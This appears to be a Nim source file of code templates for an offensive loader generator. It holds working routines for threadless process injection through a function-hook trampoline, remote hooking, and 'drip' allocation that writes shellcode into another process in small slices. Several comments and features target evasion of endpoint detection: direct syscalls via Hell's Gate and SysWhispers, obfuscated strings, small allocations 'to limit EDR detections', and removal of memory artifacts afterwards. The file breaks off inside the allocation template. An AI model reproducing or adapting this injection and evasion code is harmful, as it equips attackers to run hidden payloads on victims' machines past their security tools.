import strformat


let CustomThreadEntryStubFirst * = """

type
    MyNtFlushInstructionCache* = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, NumberofBytestoFlush: ULONG): NTSTATUS {.stdcall.}

type
  HookTrampolineBuffers* {.bycopy.} = object
    originalBytes*: HANDLE    ##  (Input) Buffer containing bytes that should be restored while unhooking.
    originalBytesSize*: DWORD  ##  (Output) Buffer that will receive bytes present prior to trampoline installation/restoring.
    previousBytes*: HANDLE
    previousBytesSize*: DWORD

var ntdlldll = LoadLibraryA("ntdll.dll")
if (ntdlldll == 0):
    echo "[X] Failed to load ntdll.dll"


var NtFlushInstructionCacheAddress = GetProcAddress(ntdlldll,"NtFlushInstructionCache")
if isNil(NtFlushInstructionCacheAddress):
    echo "[X] Failed to get the address of 'NtFlushInstructionCache'"


var NtFlushInstructionCache*: MyNtFlushInstructionCache
NtFlushInstructionCache = cast[MyNtFlushInstructionCache](NtFlushInstructionCacheAddress)

var buffers: HookTrampolineBuffers



"""

let ThreadlessInjectStub * = """

proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress: LPVOID): bool =
    var 
        trampolineStk: array[91, byte]
        trampSize: DWORD
        highBytePatched: DWORD64
        lowBytePatched: DWORD64
        szOutput: SIZE_T
        status: NTSTATUS
        pageToProtect: PVOID
        pageSize: SIZE_T
        oldProtect: DWORD
        ntStatus: NTSTATUS
        tmp: DWORD64
        trampolineAddress: PVOID
        trampolineSize: SIZE_T
        shellcode: PBYTE
        shellcodeStk: array[12, byte]
        checkArray: array[12, byte]
        exportContent: LPVOID
        hookCalled: DWORD


    
    trampolineStk = [byte 0x58,                                     # pop RAX
    0x48, 0x83, 0xe8, 0x0c,                                         # sub RAX, 0x0C                    : when the function will return, it will not return to the next instruction but to the previous one
    0x50,                                                           # push RAX
    0x55,                                                           # PUSH RBP
    0x48, 0x89, 0xE5,                                               # MOV RBP, RSP
    0x48, 0x83, 0xec, 0x08,                                         # SUB RSP, 0x08                    : always equal to 8%16 to have an aligned stack. It is mandatory for some function call
    0x50,                                                           # push RAX                         : just save the context registers
    0x53,                                                           # push RBX
    0x51,                                                           # push RCX                         
    0x52,                                                           # push RDX
    0x41, 0x50,                                                     # push R8
    0x41, 0x51,                                                     # push R9
    0x41, 0x52,                                                     # push R10
    0x41, 0x53,                                                     # push R11
    0x41, 0x54,                                                     # push R12
    0x41, 0x55,                                                     # push R13
    0x41, 0x56,                                                     # push R14
    0x48, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # movabs RCX, 0x0000000000000000   : restore the hooked function code
    0x48, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # movabs RDX, 0x0000000000000000   : restore the hooked function code
    0x48, 0x89, 0x08,                                               # mov qword ptr[rax], rcx          : restore the hooked function code
    0x48, 0x89, 0x50, 0x08,                                         # mov qword ptr[rax+0x8], rdx      : restore the hooked function code
    0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # mov RAX, 0x0000000000000000      : Address where the execution flow will be redirected
    0xff, 0xd0,                                                     # call RAX                         : Call the malicious code
    0x41, 0x5E,                                                     # pop R14                          : Restore the context
    0x41, 0x5D,                                                     # pop R13
    0x41, 0x5C,                                                     # pop R12
    0x41, 0x5b,                                                     # pop R11                          : Restore the context
    0x41, 0x5a,                                                     # pop R10
    0x41, 0x59,                                                     # pop R9
    0x41, 0x58,                                                     # pop R8
    0x5a,                                                           # pop RDX
    0x59,                                                           # pop RCX
    0x5b,                                                           # pop RBX
    0x58,                                                           # pop RAX
    0xc9,                                                           # leave
    0xc3                                                            # ret   
    ]
    trampSize = 91

    highBytePatched = 0
    lowBytePatched = 0
    szOutput = 0

    # Save the instruction of the hooked function
    # It is mandatory to save this information in order to be able
    # to restore the hook once the execution finished
    when defined(verbose):
        echo obf("[+] Saving the instruction of the hooked function: "), repr(exportAddress)
    
    when defined(Hellsgate):
        if getSyscall(ntReadTable):
            syscall = ntReadTable.wSysCall
        else:
            when defined(verbose):
                echo obf("[-] Failed to find opcode for NtReadVirtualMemory")
            return false
    status = NtReadVirtualMemory(processHandle, exportAddress, &highBytePatched, sizeof(DWORD64), &szOutput)
    if (status == 0):
        when defined(verbose):
            echo obf("[+] Read memory success "), repr(exportAddress)
    var readLowPointer: PVOID = cast[PVOID]((cast[DWORD64](exportAddress) + sizeof(DWORD64)))
    status = NtReadVirtualMemory(processHandle, readLowPointer, &lowBytePatched, sizeof(DWORD64), &szOutput)
    if (status == 0):
        when defined(verbose):
            echo obf("[+] Read memory success "), repr(readLowPointer)
    pageToProtect = exportAddress

    pageSize = 2 * sizeof(DWORD64)

    when defined(Hellsgate):
        if getSyscall(ntProtectTable):
            syscall = ntProtectTable.wSysCall
        else:
            when defined(verbose):
                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
            return false

    status = NtProtectVirtualMemory(processHandle, &pageToProtect, &pageSize, PAGE_EXECUTE_READWRITE, &oldProtect)
    if (status == 0):
        when defined(verbose):
            echo obf("[+] Protect memory success, "), repr(pageToProtect)

    tmp = highBytePatched

    # Replace the place holders in the trampoline shellcode
    # with the righ values
    moveMemory(unsafeAddr trampolineStk[34], &highBytePatched, sizeof(DWORD64))
    moveMemory(unsafeAddr trampolineStk[44], &lowBytePatched, sizeof(DWORD64))
    moveMemory(unsafeAddr trampolineStk[61], unsafeAddr jumpAddress, sizeof(DWORD64))
    # Write the trampoline somewhere in memory
    # Here VirtualAlloc is used, but some code cave can be used to limit this call
    # As the trampoline size is lesser than 4Ko, we should be ok for EDR detections
    trampolineAddress = nil
    trampolineSize = trampSize * sizeof(byte)

    when defined(Hellsgate):
        if getSyscall(ntAllocTable):
            syscall = ntAllocTable.wSysCall
        else:
            when defined(verbose):
                echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
            return false

    status = NtAllocateVirtualMemory(processHandle, &trampolineAddress, 0, &trampolineSize, MEM_COMMIT, PAGE_READWRITE)
    if (status == 0):
        when defined(verbose):
            echo obf("[+] Allocate memory success "), repr(trampolineAddress) 
    
    when defined(Hellsgate):
        if getSyscall(ntWriteTable):
            syscall = ntWriteTable.wSysCall
        else:
            when defined(verbose):
                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
            return false
    var sizeToWrite: SIZE_T = cast[SIZE_T](trampSize * sizeof(byte))
    status = NtWriteVirtualMemory(processHandle, trampolineAddress, unsafeAddr trampolineStk[0], sizeToWrite, &szOutput)
    if (status == 0):
        when defined(verbose):
            echo obf("[+] Write memory success "), repr(trampolineAddress)
    
    when defined(Hellsgate):
        if getSyscall(ntProtectTable):
            syscall = ntProtectTable.wSysCall
        else:
            when defined(verbose):
                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
            return false
    
    trampolineSize = trampSize * sizeof(byte)
    var protectionRXAddress: LPVOID = trampolineAddress
    status = NtProtectVirtualMemory(processHandle, &protectionRXAddress, &trampolineSize, PAGE_EXECUTE_READ, cast[PDWORD](&szOutput))
    if (status == 0):
        when defined(verbose):
            echo obf("[+] Protect memory success "), repr(trampolineAddress)
    when defined(verbose):
        echo obf("[+] Hook shellcode written at : "), repr(trampolineAddress)

    # Create the hook that will be placed in the remote function

    shellcodeStk = [byte 0x48, 0xB8, # mov RAX, 0x0000000000000000
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0xD0 # Call RAX
    ]
    moveMemory(unsafeAddr shellcodeStk[2], unsafeAddr trampolineAddress, sizeof(DWORD64))
    # Replace the place holder
    
    when defined(Hellsgate):
        if getSyscall(ntWriteTable):
            syscall = ntWriteTable.wSysCall
        else:
            when defined(verbose):
                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
            return false

    status = NtWriteVirtualMemory(processHandle, exportAddress, unsafeAddr shellcodeStk[0], 12 * sizeof(byte), &szOutput)
    if (status == 0):
        when defined(verbose):
            echo obf("[+] Write memory for the hook success")
    exportContent = nil
    hookCalled = 0

    when defined(localinject): # we can manually trigger the hook
        # fake type definition for ThreadlessFunc to call the function for triggering the threadless thread
        type ThreadlessFunc = proc (hProcess: HANDLE, lpBaseAddress: LPVOID, lpStartAddress: LPVOID): bool {.stdcall.}
        var ThreadlessFuncPtr: ThreadlessFunc = cast[ThreadlessFunc](exportAddress)
        when defined(verbose):
            echo obf("[*] Calling threadlessFunction")
        var threadlessFuncSuccess: bool = ThreadlessFuncPtr(-1, nil, nil)

    while (hookCalled == 0):
        when defined(verbose):
            echo obf("[-] Waiting 10 seconds for the hook to be called...")
        Sleep(10000)
        # Check if the hook has been re-patched ie has been successfully executed
        when defined(verbose):
            echo obf("[+] Checking if the hook has been called, "), repr(exportAddress)

        when defined(Hellsgate):
            if getSyscall(ntReadTable):
                syscall = ntReadTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtReadVirtualMemory")
                return false
        status = NtReadVirtualMemory(processHandle, exportAddress, unsafeAddr checkArray[0], cast[SIZE_T](12 * sizeof(byte)), &szOutput)
        if (status == 0):
            when defined(verbose):
                echo obf("[+] Read memory for the hook success")
        else:
            when defined(verbose):
                echo obf("[-] Read memory for the hook failed")
            echo toHex(status)
        hookCalled = cast[DWORD](cmpMem(unsafeAddr shellcodeStk[0], unsafeAddr checkArray[0], 12 * sizeof(byte)))
        if(hookCalled == 0):
            when defined(verbose):
                echo obf("[*] Hook not called yet...")

    # Just remove all artifacts in memory
    when defined(verbose):
        echo obf("[+] Hook called ! Releasing artifacts")
    
    var freeAddress: LPVOID = trampolineAddress
    # Re-Protect Shellcode to RW for freeing
    when defined(Hellsgate):
        if getSyscall(ntProtectTable):
            syscall = ntProtectTable.wSysCall
        else:
            when defined(verbose):
                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
            return false
    status = NtProtectVirtualMemory(processHandle, &freeAddress, &trampolineSize, PAGE_READWRITE, &oldProtect)
    #Sleep(500)

    when defined(Hellsgate):
        if getSyscall(ntFreeTable):
            syscall = ntFreeTable.wSysCall
        else:
            when defined(verbose):
                echo obf("[-] Failed to find opcode for NtFreeVirtualMemory")
            return false
    
    # use VirtualFreeEx to free the memory at trampolineAddress

    var
        FreeSuccess: WINBOOL
    
    FreeSuccess = VirtualFreeEx(processHandle, &trampolineAddress, 0, MEM_RELEASE or MEM_DECOMMIT)

    #status = NtFreeVirtualMemory(processHandle, &trampolineAddress, nil, MEM_DECOMMIT or MEM_RELEASE) # fails for some reason with access denied

    if(FreeSuccess):
        when defined(verbose):
            echo obf("[+] Free memory success "), repr(trampolineAddress)
    else:
        when defined(verbose):
            echo obf("[-] Free memory failed "), repr(trampolineAddress)
        echo toHex(status)
    #[
    var FreeSuccess = VirtualFreeEx(processHandle, &trampolineAddress, 0, MEM_RELEASE or MEM_DECOMMIT)

    if(FreeSuccess):
        when defined(verbose):
            echo obf("[+] Free memory success "), repr(trampolineAddress)
    else:
        when defined(verbose):
            echo obf("[-] Free memory failed "), repr(trampolineAddress)
    ]#

    when defined(Hellsgate):
        if getSyscall(ntProtectTable):
            syscall = ntProtectTable.wSysCall
        else:
            when defined(verbose):
                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
            return false
    status = NtProtectVirtualMemory(processHandle, &pageToProtect, &pageSize, oldProtect, &oldProtect)

    if (status == 0):
        when defined(verbose):
            echo obf("[+] Protect memory success")
    else:
        when defined(verbose):
            echo obf("[-] Protect memory failed")
        echo toHex(status)

    return true


"""

let CustomThreadEntryStubSecond * = """

    proc fastTrampoline(targetProc: HANDLE, addressToHook: LPVOID, jumpAddress: LPVOID, buffers: ptr HookTrampolineBuffers): bool =
        var trampoline: seq[byte]
        if defined(amd64):
            trampoline = @[
                byte(0x49), byte(0xBA), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov r10, addr
                byte(0x00),byte(0x00),byte(0x41), byte(0xFF),byte(0xE2)                                         # jmp r10
            ]
            var tempjumpaddr: uint64 = cast[uint64](jumpAddress)
            moveMemory(&trampoline[2] , &tempjumpaddr, 6)
        elif defined(i386):
            trampoline = @[
                byte(0xB8), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov eax, addr
                byte(0x00),byte(0x00),byte(0xFF), byte(0xE0)                                      # jmp eax
            ]
            var tempjumpaddr: uint32 = cast[uint32](jumpAddress)
            moveMemory(&trampoline[1] , &tempjumpaddr, 3)
        
        var dwSize: SIZE_T = cast[SIZE_T](len(trampoline))
        var dwOldProtect: DWORD = 0
        var output: bool = false
        var szWritten: SIZE_T = 0
        var sizeOfPage: SIZE_T = cast[SIZE_T](len(trampoline))
        var status: NTSTATUS

        if (buffers != nil):
            if ((buffers.previousBytes == 0) or buffers.previousBytesSize == 0):
                echo "Previous Bytes == 0"
                return false
            var gotMem: BOOL = ReadProcessMemory(targetProc, addressToHook, cast[LPVOID](buffers.previousBytes), buffers.previousBytesSize, nil)
            if (gotMem):
                echo "Backup for previous bytes done"
            #moveMemory(unsafeAddr buffers.previousBytes, addressToHook, buffers.previousBytesSize)


        when defined(Hellsgate):
            if getSyscall(ntProtectTable):              
                syscall = ntProtectTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                return false
        
        var protectAddress: LPVOID = addressToHook
        when defined(SysWhispers):
            status = uashdiasdj(targetProc,unsafeAddr protectAddress,addr sizeOfPage,PAGE_READWRITE ,addr dwOldProtect)
        else:
            status = NtProtectVirtualMemory(targetProc,unsafeAddr protectAddress,addr sizeOfPage,PAGE_READWRITE,addr dwOldProtect)    

        if(status != STATUS_SUCCESS):
            when defined(verbose):
                echo obf("[-] NtProtectVirtualMemory failed")
        else:
            when defined(verbose):
                echo obf("[+] NtProtectVirtualMemory succeeded")

        when defined(Hellsgate):
            if getSyscall(ntWriteTable):
                syscall = ntWriteTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
                return false
        
        when defined(SysWhispers):
            status = oqiazasusjk(targetProc,addressToHook,addr trampoline[0],dwSize,addr szWritten)
        else:
            status = NtWriteVirtualMemory(targetProc,addressToHook,addr trampoline[0],dwSize,addr szWritten)
        
        if(status != STATUS_SUCCESS):
            when defined(verbose):
                echo obf("[-] NtWriteVirtualMemory failed")
        else:
            when defined(verbose):
                echo obf("[+] NtWriteVirtualMemory succeeded")
                output = true

        when defined(Hellsgate):
            if getSyscall(ntProtectTable):              
                syscall = ntProtectTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                return false
        
        protectAddress = addressToHook
        when defined(SysWhispers):
            status = uashdiasdj(targetProc,unsafeAddr protectAddress,addr sizeOfPage,PAGE_EXECUTE_READ ,addr dwOldProtect)
        else:
            status = NtProtectVirtualMemory(targetProc,unsafeAddr protectAddress,addr sizeOfPage,PAGE_EXECUTE_READ,addr dwOldProtect)    

        if(status != STATUS_SUCCESS):
            when defined(verbose):
                echo obf("[-] NtProtectVirtualMemory failed")
        else:
            when defined(verbose):
                echo obf("[+] NtProtectVirtualMemory succeeded")

        #[
        var yeah: WINBOOL = WriteProcessMemory(targetProc, addressToHook, addr trampoline[0], dwSize, nil)
        if (yeah == 0):
            echo "[-] WriteProcessMemory failed: ", toHex(GetLastError())
        else:
            echo "[+] WriteProcessMemory success"
        #moveMemory(addressToHook, addr trampoline[0], dwSize)
        output = true
        ]#
        
        var flushstatus = NtFlushInstructionCache(-1, addressToHook, ULONG(dwSize))
        if (flushstatus == 0):
            echo "[+] NtFlushInstructionCache success"
        else:
            echo "[-] NtFlushInstructionCache failed: ", toHex(status)
        
        #VirtualProtect(addressToHook, dwSize, dwOldProtect, &dwOldProtect)

        return output


    proc prepEntry(hProc: HANDLE, jumpAddress: LPVOID, jmpModName: string, jmpFuncName: string): LPVOID =
        
        var lpDllExport: LPVOID
        if (jmpModName == obf("ntdll.dll")):

            var hJmpMod: HMODULE = GetModuleHandle(jmpModName)

            if(hJmpMod == 0):
                return nil 

            lpDllExport = GetProcAddress(hJmpMod, jmpFuncName)
        else:
            var RemoteHandle = GetRemoteModuleHandle(hProc, jmpModName)
            if RemoteHandle == 0:
                when defined(verbose):
                    echo obf("[X] Failed to get "), jmpModName, obf(" handle")
                return nil

            lpDllExport = GetRemoteProcAddress(hProc, RemoteHandle, jmpFuncName)
            if lpDllExport == NULL:
                when defined(verbose):
                    echo obf("[X] Failed to get the address of "), jmpFuncName
                return nil

        buffers.previousBytes = cast[HANDLE](lpDllExport)
        buffers.previousBytesSize = DWORD(sizeof(lpDllExport))
        when defined(verbose):
            echo obf("\r\n[*] Hooking function: "), toHex(cast[HANDLE](lpDllExport))
        discard fastTrampoline(hProc, lpDllExport, jumpAddress, &buffers)

        return lpDllExport

    proc restoreBytes(hProc: HANDLE, addressToHook: LPVOID): bool =
        var dwSize: SIZE_T = cast[SIZE_T](buffers.previousBytesSize)
        var dwOldProtect: DWORD = 0
        var output: bool = false
        var szWritten: SIZE_T = 0
        var sizeOfPage: SIZE_T = cast[SIZE_T](buffers.previousBytesSize)
        var status: NTSTATUS

        when defined(Hellsgate):
            if getSyscall(ntProtectTable):              
                syscall = ntProtectTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                return false
        
        var protectAddress: LPVOID = addressToHook
        when defined(SysWhispers):
            status = uashdiasdj(hProc,unsafeAddr protectAddress,addr sizeOfPage,PAGE_READWRITE ,addr dwOldProtect)
        else:
            status = NtProtectVirtualMemory(hProc,unsafeAddr protectAddress,addr sizeOfPage,PAGE_READWRITE,addr dwOldProtect)    

        if(status != STATUS_SUCCESS):
            when defined(verbose):
                echo obf("[-] NtProtectVirtualMemory failed")
        else:
            when defined(verbose):
                echo obf("[+] NtProtectVirtualMemory succeeded")

        when defined(Hellsgate):
            if getSyscall(ntWriteTable):
                syscall = ntWriteTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
                return false
        
        when defined(SysWhispers):
            status = oqiazasusjk(hProc,addressToHook,cast[LPCVOID](buffers.previousBytes),dwSize,addr szWritten)
        else:
            status = NtWriteVirtualMemory(hProc,addressToHook,cast[LPCVOID](buffers.previousBytes),dwSize,addr szWritten)
        
        if(status != STATUS_SUCCESS):
            when defined(verbose):
                echo obf("[-] NtWriteVirtualMemory failed")
        else:
            when defined(verbose):
                echo obf("[+] NtWriteVirtualMemory succeeded")
                output = true

        when defined(Hellsgate):
            if getSyscall(ntProtectTable):              
                syscall = ntProtectTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                return false
        
        protectAddress = addressToHook
        when defined(SysWhispers):
            status = uashdiasdj(hProc,unsafeAddr protectAddress,addr sizeOfPage,PAGE_EXECUTE_READ ,addr dwOldProtect)
        else:
            status = NtProtectVirtualMemory(hProc,unsafeAddr protectAddress,addr sizeOfPage,PAGE_EXECUTE_READ,addr dwOldProtect)    

        if(status != STATUS_SUCCESS):
            when defined(verbose):
                echo obf("[-] NtProtectVirtualMemory failed")
        else:
            when defined(verbose):
                echo obf("[+] NtProtectVirtualMemory succeeded")


        var flushstatus = NtFlushInstructionCache(-1, addressToHook, ULONG(dwSize))
        if (flushstatus == 0):
            echo "[+] NtFlushInstructionCache success"
        else:
            echo "[-] NtFlushInstructionCache failed: ", toHex(status)
        

        return output

"""

let DripAllocateStubFirst * = """

when defined(remoteMapSection):
    when defined(AllocateDripStyle):
        var decryptbuffer: LPVOID

const VC_PREF_BASES: seq[pointer] = @[cast[pointer](0x00000007FFFF0000),
    cast[pointer](0x00000000DDDD0000),
    cast[pointer](0x0000000010000000),
    cast[pointer](0x0000000021000000),
    cast[pointer](0x0000000032000000),
    cast[pointer](0x0000000043000000),
    cast[pointer](0x0000000050000000),
    cast[pointer](0x0000000041000000),
    cast[pointer](0x0000000042000000),
    cast[pointer](0x0000000040000000),
    cast[pointer](0x0000000022000000)]

proc GetSuitableBaseAddress(hProc: HANDLE, szPage: DWORD, szAllocGran: DWORD, cVmResv: DWORD): LPVOID =
    var mbi: MEMORY_BASIC_INFORMATION

    for base in VC_PREF_BASES:
        when defined(verbose):
            echo obf("[*] Calling VirtualQueryEx for address "), repr(base), obf(" with size "), sizeof(mbi).SIZE_T
        VirtualQueryEx(hProc, cast[LPVOID](base), addr mbi, sizeof(mbi).SIZE_T)
        #echo "GetLastError: ", GetLastError()
        if mbi.State == MEM_FREE:
            var i: DWORD = 0
            while i < cVmResv:
                let currentBase = cast[LPVOID](cast[DWORD_PTR](base) + i * szAllocGran)
                when defined(verbose):
                    echo obf("[*] Checking CurrentBase plus offset: "), repr(currentBase)
                VirtualQueryEx(hProc, currentBase, addr mbi, sizeof(mbi).SIZE_T)
                i += 1
                if mbi.State != MEM_FREE:
                    when defined(verbose):
                        echo obf("[-] Mem not free")
                    break
                else:
                    when defined(verbose):
                        echo obf("[+] Mem free")
            if i == cVmResv:
                # found suitable base
                return cast[LPVOID](base)

    result = nil

"""

let DripAllocateStubSecond * = """

    proc DripAllocate(ProcessHandle: HANDLE, RegionSize: SIZE_T, scArray: openarray[byte]): LPVOID =
        
        var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
        
        when defined(RX):
            protectionValue = PAGE_EXECUTE_READ
        
        var sys_inf: SYSTEM_INFO
        GetSystemInfo(addr sys_inf)
        var page_size: DWORD = sys_inf.dwPageSize
        var alloc_gran: DWORD = sys_inf.dwAllocationGranularity

        if page_size == 0:
            page_size = 0x1000

        if alloc_gran == 0:
            alloc_gran = 0x10000
        
        var numberOfAllocations: DWORD = DWORD((DWORD(RegionSize) / alloc_gran) + 1)
        when defined(verbose):
            echo obf("[*] Shellcode size: "), RegionSize
            echo obf("[*] Allocation Granularity: "), alloc_gran
            echo obf("[*] Going to allocate for "), numberOfAllocations, obf(" times")
        
        var vmBaseAddress: LPVOID

        when defined(remoteMapSection):
            var vmBaseAddressLocal: LPVOID = GetSuitableBaseAddress(-1, page_size, alloc_gran, numberOfAllocations)
            vmBaseAddress = vmBaseAddressLocal
            var checkDone: bool = false
            when defined(remoteinject):
                vmBaseAddress = GetSuitableBaseAddress(ProcessHandle, page_size, alloc_gran, numberOfAllocations)
        else:
            vmBaseAddress = GetSuitableBaseAddress(ProcessHandle, page_size, alloc_gran, numberOfAllocations)

        if vmBaseAddress == nil:
            when defined(verbose):
                echo obf("[-] GetSuitableBaseAddress failed")
            return nil
        else:
            when defined(verbose):
                echo obf("[+] GetSuitableBaseAddress succeeded")
                echo obf("[*] Base address: "), repr(vmBaseAddress)
        
        var status: NTSTATUS = 0
        var cmm_i: DWORD
        var currentVmBase: LPVOID = cast[LPVOID](vmBaseAddress)

        var vcVmResv: seq[LPVOID] = @[]
        when defined(remoteMapSection):
                var vcVmResvRemote: seq[LPVOID] = @[]
        var sc_size: SIZE_T = cast[SIZE_T](alloc_gran)

        # Reserve enough memory
        var i: DWORD
        for i in 1..numberOfAllocations:
            Sleep(DWORD(dripsleepinbetween))
            

            when defined(remoteMapSection):
                when defined(Hellsgate):
                    if getSyscall(ntCreateSectionTable):
                        syscall = ntCreateSectionTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtCreateSection")
                
                # NtCreateSection Call
                var sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)
                var hMapFile: HANDLE
                var protectionValueCreate: DWORD = PAGE_EXECUTE_READWRITE
                when defined(Syswhispers):
                    status = iuhqdihasduiahsdaksdhak(cast[PHANDLE](&buffer),SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,ULONG(protectionValue),SEC_COMMIT,0)
                else:
                    status = NtCreateSection(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,protectionValueCreate,SEC_COMMIT,0)
                when defined(verbose):
                    echo obf("[*] NtCreateSection: "), toHex(status)
                    #echo "This is the prompt"
                    #var input = readLine(stdin)
                if (hMapFile == 0):
                    echo obf("[-] Failed to create file mapping")
                
                when defined(Hellsgate):
                    if getSyscall(ntMapViewOfSectionTable):
                        syscall = ntMapViewOfSectionTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtMapViewOfSection")
            
                var
                    vSize: SIZE_T = sc_size
                
                # We cannot allocate with PAGE_NOACCESS here, as this protection is afterwards not changable by NtProtectVirtualMemory.
                # So we need to use PAGE_READWRITE instead. But we have the advantage, that we don't need to decrypt the Shellcode
                # as that can be done later on over the current process mapped section which is still PAGE_READWRITE.
                when defined(Syswhispers):
                    uihzasdbnqlpoasdlykxc(hMapFile,-1,&vmBaseAddressLocal,0,0,NULL,&vSize,2,0,PAGE_READWRITE)
                else:
                    status = NtMapViewOfSection(hMapFile,-1,&vmBaseAddressLocal,0,0,NULL,&vSize,2,0,PAGE_READWRITE)

                if not NT_SUCCESS(status):
                    when defined(verbose):
                        echo obf("[-] NtMapViewOfSection failed")
                        echo obf("[*] NTSTATUS: "), toHex(status)

                else:
                    when defined(verbose):
                        echo obf("[+] NtMapViewOfSection success!")
                        echo obf("[*] Address: "), repr(vmBaseAddressLocal)
                        vcVmResv.add(vmBaseAddressLocal)
                        vmBaseAddressLocal = cast[LPVOID](cast[DWORD_PTR](vmBaseAddressLocal) + sc_size)
                        #echo "This is the prompt"
                        #var input = readLine(stdin)
                
                when defined(localinject): # for local injection both are the same, but we need two different sections. One for RW and one for RX.
                    if (checkDone == false):
                        vmBaseAddress = GetSuitableBaseAddress(ProcessHandle, page_size, alloc_gran, numberOfAllocations)
                        checkDone = true

                when defined(Syswhispers):
                    uihzasdbnqlpoasdlykxc(hMapFile,ProcessHandle,&vmBaseAddress,0,0,NULL,&vSize,2,0,protectionValue)
                else:
                    status = NtMapViewOfSection(hMapFile,ProcessHandle,&vmBaseAddress,0,0,NULL,&vSize,2,0,protectionValue)

                if not NT_SUCCESS(status):
                    when defined(verbose):
                        echo obf("[-] NtMapViewOfSection failed")
                        echo obf("[*] NTSTATUS: "), toHex(status)
                else:
                    when defined(verbose):
                        echo obf("[+] NtMapViewOfSection success!")
                        echo obf("[*] Address: "), repr(vmBaseAddress)
                        vcVmResvRemote.add(vmBaseAddress)
                        vmBaseAddress = cast[LPVOID](cast[DWORD_PTR](vmBaseAddress) + sc_size)
                        #echo "This is the prompt"
                        #var input = readLine(stdin)

            else:
                when defined(Hellsgate):
                    if getSyscall(ntAllocTable):
                        syscall = ntAllocTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Hook - Failed to find opcode for NtAllocateVirtualMemory")
                    
                when defined(SysWhispers):
                    status = oqiahsjynmxkla(ProcessHandle,addr currentVmBase,0,&sc_size,MEM_RESERVE,PAGE_NOACCESS #[PAGE_EXECUTE_READ_WRITE]#)
                else:
                    status = NtAllocateVirtualMemory(ProcessHandle,addr currentVmBase,0,&sc_size,MEM_RESERVE,PAGE_NOACCESS #[PAGE_EXECUTE_READ_WRITE]#)

                    
                if status == STATUS_SUCCESS:
                    when defined(verbose):
                        echo obf("[+] NtAllocateVirtualMemory succeeded")
                    vcVmResv.add(currentVmBase)
                else:
                    when defined(verbose):
                        echo obf("[-] NtAllocateVirtualMemory failed")
                    return nil

                currentVmBase = cast[LPVOID](cast[DWORD_PTR](currentVmBase) + sc_size)
        
        # Set the final decryptbuffer address to the first reserved address
        when defined(remoteMapSection):
            when defined(AllocateDripStyle):
                decryptbuffer = vcVmResv[0]

        var offsetSc: DWORD = 0
        var oldProt: DWORD

        # Loop over the pages and commit our sc blob in 4kB slices
        
        var sizeOfPage: SIZE_T = cast[SIZE_T](page_size)

        var memoryCalc: DWORD = DWORD(DWORD(sc_size) / DWORD(sizeOfPage))
        
        when not defined(remoteMapSection): # we can decrypt later with mapped sections
            when defined(localinject): # But we cannot with NtAllocateVirtualMemory
                ptrEncText = cast[ptr byte](unsafeAddr scArray)
                ptrDecText = cast[ptr byte](unsafeAddr scArray)
                decryptlate()
            else:
                ptrEncText = cast[ptr byte](addr encText[0])
                ptrDecText = cast[ptr byte](addr decText[0])
                decryptlate()

        for i in 0..<numberOfAllocations:
            for cmm_i in 0..<memoryCalc:
                
                let offset = cmm_i * sizeOfPage
                currentVmBase = cast[LPVOID](cast[DWORD_PTR](vcVmResv[i]) + offset)

                when not defined(remoteMapSection):
                    when defined(Hellsgate):
                        if getSyscall(ntAllocTable):
                            syscall = ntAllocTable.wSysCall
                        else:
                            when defined(verbose):
                                echo obf("[-] Hook - Failed to find opcode for NtAllocateVirtualMemory")
                        
                    when defined(SysWhispers):
                        status = oqiahsjynmxkla(ProcessHandle,addr currentVmBase,0,addr sizeOfPage,MEM_COMMIT,PAGE_READWRITE)
                    else:
                        status = NtAllocateVirtualMemory(ProcessHandle,addr currentVmBase,0,addr sizeOfPage,MEM_COMMIT,PAGE_READWRITE)

                    
                    if(status != STATUS_SUCCESS):
                        when defined(verbose):
                            echo obf("[-] NtAllocateVirtualMemory failed")
                        return nil
                    else:
                        when defined(verbose):
                            echo obf("\r\n[+] NtAllocateVirtualMemory succeeded")
                            echo obf("[*] Address: "), repr(currentVmBase)

                Sleep(DWORD(dripsleepinbetween))
                
                when defined(remoteMapSection):
                    echo obf("[*] Moving partial shellcode to memory")
                    moveMemory(currentVmBase, cast[pointer](unsafeAddr scArray[offsetSc]), int(sizeOfPage))
                else:
                    var szWritten: SIZE_T = 0

                    when defined(Hellsgate):
                        if getSyscall(ntWriteTable):
                            syscall = ntWriteTable.wSysCall
                        else:
                            when defined(verbose):
